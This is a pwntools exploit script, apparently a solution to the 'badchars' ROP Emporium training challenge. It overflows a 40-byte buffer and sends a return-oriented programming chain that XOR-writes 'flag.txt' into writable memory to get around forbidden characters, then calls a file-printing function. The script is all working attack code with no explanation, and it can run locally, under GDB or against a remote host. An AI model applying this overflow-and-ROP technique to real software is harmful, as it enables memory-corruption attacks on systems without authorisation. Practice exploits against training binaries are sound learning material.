from pwn import *

elf = context.binary = ELF('./badchars')
context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("n/A", 10305)
elif args.GDB:  
    conn = gdb.debug([elf.path], gdbscript='''
    b pwnme
    c
    ''')
else:
    conn = elf.process()

pop_r14_r15 = 0x4006a0
pop_rdi = 0x4006a3
xor_r15_r14b = 0x400628
conn.sendline(b'b'*40 + flat([
    pop_r14_r15,
    ord("f"),
    0x60102F,
    xor_r15_r14b,
    pop_rdi,
    0x60102F,

    pop_r14_r15,
    ord("l"),
    0x60102F+1,
    xor_r15_r14b,

    pop_r14_r15,
    ord("a")^1,
    0x60102F+2,
    xor_r15_r14b,
    pop_r14_r15,
    1,
    0x60102F+2,
    xor_r15_r14b,

    pop_r14_r15,
    ord("g")^1,
    0x60102F+3,
    xor_r15_r14b,
    pop_r14_r15,
    1,
    0x60102F+3,
    xor_r15_r14b,

    pop_r14_r15,
    ord(".")^1,
    0x60102F+4,
    xor_r15_r14b,
    pop_r14_r15,
    1,
    0x60102F+4,
    xor_r15_r14b,

    pop_r14_r15,
    ord("t"),
    0x60102F+5,
    xor_r15_r14b,

    pop_r14_r15,
    ord("x")^1,
    0x60102F+6,
    xor_r15_r14b,
    pop_r14_r15,
    1,
    0x60102F+6,
    xor_r15_r14b,
    
    pop_r14_r15,
    ord("t"),
    0x60102F+7  ,
    xor_r15_r14b,

    0x400510
]))
conn.interactive()

